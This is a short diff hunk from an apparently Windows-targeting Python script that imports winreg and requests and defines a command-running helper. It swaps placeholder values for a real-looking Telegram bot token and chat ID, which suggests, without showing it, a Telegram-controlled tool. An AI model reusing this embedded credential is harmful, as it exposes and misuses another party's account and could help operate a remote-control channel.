@@ -13,8 +13,8 @@ import threading
 import winreg
 import requests
 
-TELEGRAM_TOKEN = "PASTE_YOUR_BOT_TOKEN"
-TELEGRAM_CHAT_ID = "PASTE_YOUR_CHAT_ID"
+TELEGRAM_TOKEN = "8870553187:AAHDDpqsXzkUo7aqacrX_y1DbnTIEa121ug"
+TELEGRAM_CHAT_ID = "8224529558"
 
 def _run(cmd):
     try:
